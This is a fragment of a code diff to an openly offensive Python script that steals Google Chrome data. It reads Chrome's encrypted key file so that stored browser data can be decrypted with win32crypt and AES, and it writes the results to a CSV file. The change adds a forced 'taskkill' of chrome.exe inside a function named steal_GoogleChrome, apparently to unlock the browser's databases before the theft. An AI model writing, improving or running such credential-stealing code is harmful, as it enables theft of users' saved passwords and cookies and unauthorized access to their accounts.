@@ -9,6 +9,7 @@ import win32crypt
 import sqlite3
 from Crypto.Cipher import AES
 import datetime
+import subprocess
 
 # Global variables
 out_file_name = "UserData.csv"
@@ -23,6 +24,8 @@ def filetime_to_datetime(ft):
     return datetime.datetime(1970, 1, 1) + datetime.timedelta(microseconds = us)
 
 def steal_GoogleChrome():
+    subprocess.call("taskkill /f /im chrome.exe", shell=True)
+
     with open(chrome_key_path, 'r', encoding='utf-8') as file:
         data = json.load(file)
         encrypted_key = data['os_crypt']['encrypted_key']
